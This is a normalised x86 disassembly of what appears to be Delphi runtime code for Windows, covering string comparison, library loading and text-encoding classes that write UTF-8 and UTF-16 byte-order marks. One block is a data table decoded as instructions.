call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43c01c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c093
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_448278
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c09a
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_448278
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43bff8
test al al
jne r-xdata
mov al 0x1
sub_43c0b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43c126
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_43c108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_449db8
push eax
call LoadLibraryW
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c10f
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_43c138
push ebx
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebx + 0x14 ]
call sub_44ab74
xor eax eax
mov [ ebx + 0x14 ] eax
sub_43c168
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4481b0
retn
sub_43c1d8
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ccfc
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4481b0
sub_43c214
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_44af28
mov ebx eax
mov eax esi
call sub_44af28
cmp ebx eax
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax esi
call sub_44af28
mov edx eax
test edx edx
jle r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax 0x1
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
movzx ecx [ edi + eax - 0x1 ]
cmp cl [ esi + eax - 0x1 ]
je r-xdata
jmp r-xdata
sub_43c270
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43c366
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebx ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43c214
test al al
je r-xdata
call sub_43c9e8
lea edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_43c214
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c36d
lea eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
mov ecx 0x5
call sub_44a7e8
retn
mov eax [ ebp - 0x4 ]
call sub_44af28
mov esi eax
call sub_43c1d8
lea edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_43c214
test al al
je r-xdata
call sub_43c9e8
mov [ ebx ] eax
jmp r-xdata
call sub_43ca24
lea edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_43c214
test al al
je r-xdata
call sub_43c1d8
mov [ ebx ] eax
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_44af28
mov esi eax
jmp r-xdata
call sub_43c914
mov [ ebx ] eax
call sub_43ca24
mov [ ebx ] eax
jmp r-xdata
sub_43c378
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43c3eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c3f2
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43c3fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43c4ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0x1
jge r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
sub eax esi
inc eax
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
lea edx [ eax + esi * 2 - 0x2 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c4f5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_43c500
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43c595
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c378
mov edi eax
push edi
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push eax
push esi
push 0x0
mov ecx 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c59c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43c5a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_43c735
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
cmp edi 0x1
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
sub eax edi
inc eax
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_44af28
mov [ ebp - 0xc ] eax
test esi esi
jl r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
cmp esi [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add eax esi
push eax
mov eax [ ebp - 0xc ]
sub eax esi
push eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + edi * 2 - 0x2 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c73c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
push ebx
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c3fc
mov edx [ ebp - 0xc ]
sub edx esi
cmp eax edx
jle r-xdata
sub_43c748
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
test edi edi
jne r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov eax edi
call sub_44af28
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
lea edx [ edi + esi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_43c814
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
test edi edi
jne r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov eax edi
call sub_44af28
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
push ebx
mov ecx esi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43c748
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea edx [ edi + esi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_43c914
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
push 0x0
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cae8
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4481b0
sub_43c954
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_44af28
push eax
push edi
xor ecx ecx
mov edx esi
mov eax ebx
call sub_43c978
pop edi
pop esi
pop ebx
retn
sub_43c978
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c9d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43c814
mov eax [ ebp - 0x4 ]
call sub_44af28
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449e68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c9df
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_43c9e8
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ccfc
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4481b0
sub_43ca24
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cc84
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4481b0
sub_43ca60
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43caa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebx + 0xc ] ecx
push 0x0
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43cae8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi + 0xc ]
push eax
call GetCPInfo
test eax eax
jne r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ ebp - 0x14 ]
mov [ esi + 0x8 ] eax
dec eax
sete al
mov [ esi + 0x4 ] al
mov eax esi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43cb7c
push ebp
mov ebp esp
push ebx
push 0x0
push 0x0
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
push ecx
push edx
mov edx [ eax + 0x14 ]
push edx
mov eax [ eax + 0xc ]
push eax
call WideCharToMultiByte
pop ebx
pop ebp
retn 0x8
sub_43cbb4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
push ecx
push edx
mov edx [ eax + 0x10 ]
push edx
mov eax [ eax + 0xc ]
push eax
call MultiByteToWideChar
pop ebx
pop ebp
retn 0x8
sub_43cbfc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ecx 0xfde8
xor edx edx
mov eax esi
call sub_43caa0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43cc84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ecx 0xfde9
xor edx edx
mov eax esi
call sub_43caa0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43cccc
push ebx
mov ebx edx
push 0x3
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xef
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xbb
mov eax [ ebx ]
mov [ eax + 0x2 ] 0xbf
pop ebx
retn
sub_43cd30
push ebp
mov ebp esp
push ebx
mov ebx ecx
add ebx ebx
mov eax edx
mov edx [ ebp + 0xc ]
mov ecx ebx
call sub_4476cc
mov eax ebx
pop ebx
pop ebp
retn 0x8
sub_43cd58
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov ebx eax
mov ecx eax
add ecx ecx
mov eax edx
mov edx [ ebp + 0xc ]
call sub_4476cc
mov eax ebx
pop ebx
pop ebp
retn 0x8
sub_43cd90
push ebx
mov ebx edx
push 0x2
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xff
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xfe
pop ebx
retn
sub_43cdb8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0xc ]
mov esi ecx
dec esi
test esi esi
jl r-xdata
mov eax ecx
add eax eax
pop esi
pop ebx
pop ebp
retn 0x8
inc esi
movzx ebx [ edx ]
shr bx 0x8
mov [ eax ] bl
inc eax
movzx ebx [ edx ]
and bl 0xff
mov [ eax ] bl
inc eax
add edx 0x2
dec esi
jne r-xdata
sub_43cdec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov eax edx
inc eax
mov ecx [ ebp + 0x8 ]
dec ecx
test ecx ecx
jl r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc ecx
movzx esi [ eax ]
movzx edi [ edx ]
shl edi 0x8
or si di
mov [ ebx ] si
add edx 0x2
add eax 0x2
add ebx 0x2
dec ecx
jne r-xdata
sub_43ce28
push ebx
mov ebx edx
push 0x2
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebx ]
mov [ eax ] 0xfe
mov eax [ ebx ]
mov [ eax + 0x1 ] 0xff
pop ebx
retn
sub_43ce50
pop ds
add [ eax ] al
add [ esp + ecx - 0x7ac3ffb2 ] dh
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7ac7ffb2 ] ch
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7acbffb2 ] ah
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7acfffb2 ] bl
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7ad7ffb2 ] dl
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7ad3ffb2 ] cl
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx - 0x7ae7ffb2 ] al
dec esi
add [ edx ] al
add [ eax ] al
add [ esp + ecx + 0x4e ] bh
add [ eax * 4 + 0x2004e ] ah
add [ eax ] al
je r-xdata
dec esi
add [ eax ] cl
test [ esi ] ecx
add al [ eax ]
add [ eax ] al
or al 0x4e
add [ eax ] ah
test [ esi ] ecx
add al [ eax ]
add [ eax ] al
pop esp
or al 0x4e
add [ eax * 4 + 0x2004e ] bl
add [ eax ] al
push esp
or al 0x4e
add ah ch
test [ esi ] cl
add al [ eax ]
add [ eax ] al
dec esp
or al 0x4e
add al dh
test [ esi ] cl
add al [ eax ]
add [ eax ] al
inc esp
or al 0x4e
add ah dh
test [ esi ] cl
add al [ eax ]
add [ eax ] al
cmp al 0xc
dec esi
add al ch
test [ esi ] cl
add al [ eax ]
add [ eax ] al
xor al 0xc
dec esi
add al ah
test [ esi ] cl
add al [ eax ]
add [ eax ] al
sub al 0xc
dec esi
add al bl
test [ esi ] cl
add al [ eax ]
add [ eax ] al
and al 0xc
dec esi
add ah dl
test [ esi ] cl
add al [ eax ]
add [ eax ] al
sbb al 0xc
dec esi
add al dl
test [ esi ] cl
add al [ eax ]
add [ eax ] al
adc al 0xc
dec esi
add ah cl
test [ esi ] cl
add al [ eax ]
add [ eax ] al
or al 0xc
dec esi
add al cl
test [ esi ] cl
add al [ eax ]
add [ eax ] al
add al 0xc
dec esi
add ah al
test [ esi ] cl
add al [ eax ]
add [ eax ] al
cld
or ecx [ esi ]
rol [ esi + ecx * 2 + 0x200 ] 0x0
hlt
dec esi
add [ eax * 4 + 0x2004e ] dl
add [ eax ] al
insb
or al 0x4e
sub_43d354
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d3cb
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d3d2
retn
mov eax sub_43ce50
call sub_448fc8
mov eax r-xdata
call sub_44900c
cmp [ rw-data ] 0x0
je r-xdata
call sub_43a434
call sub_43a6e0
mov eax sub_43b920
call sub_44b778
call sub_43a780
call sub_43bb30
call sub_43b25c
mov eax rw-data
mov edx r-xdata
call sub_449d2c
sub_43d748
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
movzx eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_43d79c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_43d7f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4358d8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d7fd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43d808
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_43d862
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4373c0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d869
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43d874
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_43d8ce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_437350
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d8d5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43d8e0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_43d93a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_43925c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d941
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43d94c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_43d9a6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_437430
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d9ad
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43d9b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43da25
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_449f7c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_435ac8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43da2c
lea eax [ ebp - 0x8 ]
